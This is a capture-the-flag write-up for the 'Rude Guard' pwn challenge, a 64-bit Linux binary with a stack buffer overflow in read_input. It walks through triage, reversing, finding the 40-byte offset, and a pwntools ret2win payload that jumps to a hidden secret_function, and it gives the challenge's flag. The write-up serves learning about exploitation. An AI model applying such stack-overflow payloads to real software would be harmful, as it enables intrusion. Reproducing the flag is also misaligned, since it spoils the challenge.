# Rude Guard Writeup

## Challenge

> There's a guard that's protecting the flag! How do I sneak past him?

This is a straightforward 64-bit Linux ret2win challenge. The program checks one command-line argument, then reads attacker-controlled data into a too-small stack buffer. A hidden function prints the flag.

## Initial Triage

The directory contains one binary:

```bash
file pwnable
checksec --file=./pwnable
strings -a -n 4 pwnable
```

Important results:

- 64-bit ELF, dynamically linked, not stripped
- No PIE
- No stack canary
- Executable stack / RWX segments
- A suspicious hidden symbol: `secret_function`

The strings also show the basic flow:

- `Are you not going to say hello?`
- `Hi. Go away.`
- `Hi. What do you want.`
- `givemeflag`
- `How rude! utflag{you're going to need a sneakier way in...}`
- `I won't let you pass. No matter what.`

That is a strong hint that there is a fake flag path and a real hidden path.

## Reversing

The two functions that matter are `main` and `read_input`.

```bash
objdump -d -Mintel pwnable | sed -n '/<main>:/,/^$/p'
objdump -d -Mintel pwnable | sed -n '/<read_input>:/,/^$/p'
objdump -d -Mintel pwnable | sed -n '/<secret_function>:/,/^$/p'
```

### `main`

`main` requires exactly one argument. If no argument is provided, it prints:

```text
Are you not going to say hello?
```

If an argument is present, it does:

```c
value = atoi(argv[1]);
if (value != 0x656c6c6f) {
    puts("Hi. Go away.");
    return 0;
}

puts("Hi. What do you want.");
read_input(value);
```

So the required command-line argument is the decimal value of `0x656c6c6f`:

```text
1701604463
```

Once that check passes, the program calls `read_input`.

### `read_input`

The bug is here:

```c
char buf[0x20];
read(fd, buf, 0x64);
```

The function allocates a 32-byte stack buffer at `[rbp-0x20]`, then reads 100 bytes into it. That overwrites saved `rbp` and the saved return address.

After the read, it compares the input against `"givemeflag"`:

```c
if (!strcmp(buf, "givemeflag")) {
    puts("How rude! utflag{you're going to need a sneakier way in...}");
} else {
    puts("I won't let you pass. No matter what.");
}
```

That printed `utflag{...}` string is a decoy. The real goal is to use the overflow.

### `secret_function`

The binary contains a hidden `secret_function` at:

```text
0x40124f
```

It builds an XOR-encoded byte array on the stack and prints the decoded result one character at a time with `putchar`. That decoded string is the real flag.

## Finding the Offset

Because `read_input` uses a normal stack frame, the offset to RIP is:

- 32 bytes for `buf`
- 8 bytes for saved `rbp`

So the saved return address is overwritten after 40 bytes.

I verified that with a cyclic pattern:

```python
from pwn import *

elf = ELF("./pwnable", checksec=False)
p = process([elf.path, str(0x656c6c6f)])
p.send(cyclic(100, n=8))
p.wait()
core = p.corefile
print(cyclic_find(core.read(core.rsp, 8), n=8))
```

This returns:

```text
40
```

## Exploit Strategy

This is a classic ret2win:

1. Launch the binary with the correct argument: `1701604463`
2. Send 40 bytes of padding
3. Overwrite RIP with `secret_function` (`0x40124f`)

Payload layout:

```text
"A" * 40 + p64(0x40124f) + p64(0x0)
```

The final `p64(0)` is not strictly necessary for control flow, but it makes the stack layout slightly cleaner after `secret_function` returns.

## Solver

I wrote the exploit as [`solve.py`](/home/al/Downloads/CTF/utctf2026/pwn/rudeguard/solve.py).

Key parts:

```python
HELLO = str(0x656C6C6F)
OFFSET = 40

def build_payload():
    return flat(
        b"A" * OFFSET,
        elf.sym.secret_function,
        0,
    )
```

For local execution the solver runs the binary through `stdbuf -o0`. That matters because `secret_function` uses `putchar`, and without unbuffered stdout the process can crash before the flag is flushed.

Run it with:

```bash
python3 solve.py
```

Local output:

```text
I won't let you pass. No matter what.
utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}
```

## Flag

```text
utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}
```

## Summary

The challenge tries to distract you with the `"givemeflag"` branch and the fake flag string, but the real issue is the stack overflow in `read_input`. Once the `atoi(argv[1]) == 0x656c6c6f` gate is satisfied, a 40-byte overwrite is enough to return directly into `secret_function` and print the real flag.
